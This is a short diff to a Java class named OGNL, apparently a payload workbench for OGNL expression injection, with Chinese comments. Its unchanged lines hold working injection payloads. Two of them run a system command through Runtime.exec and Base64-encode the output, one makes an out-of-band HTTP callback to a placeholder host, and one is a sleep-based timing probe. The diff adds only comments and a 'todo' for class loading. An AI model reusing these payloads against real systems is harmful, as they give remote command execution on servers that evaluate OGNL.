@@ -46,7 +46,8 @@ public class OGNL {
         /**
          * base64加密
          */
-        // 原生 > JDK8 todo
+        // 原生 > JDK8
+        // todo 其他写法
         String base64Encode = "(#inputStream=@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()).(@java.util.Base64@getEncoder().encodeToString((new java.util.Scanner(#inputStream).useDelimiter('\\\\A').next().getBytes())))";
 //        // 用 IOUtils 实现
         String base64EncodeIOUtils = "(#str=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream(),'UTF-8')).(#base64=@java.util.Base64@getEncoder().encodeToString(#str.getBytes()))";
@@ -58,6 +59,10 @@ public class OGNL {
         String HTTPLOG = "new java.net.URL('http://host').getContent()";
         // 延时
         String sleep = "@java.lang.Thread@sleep(10000)";
+
+        /**
+         * todo 类加载
+         */
 
 
         Object obj = ognlGetValue(sleep);
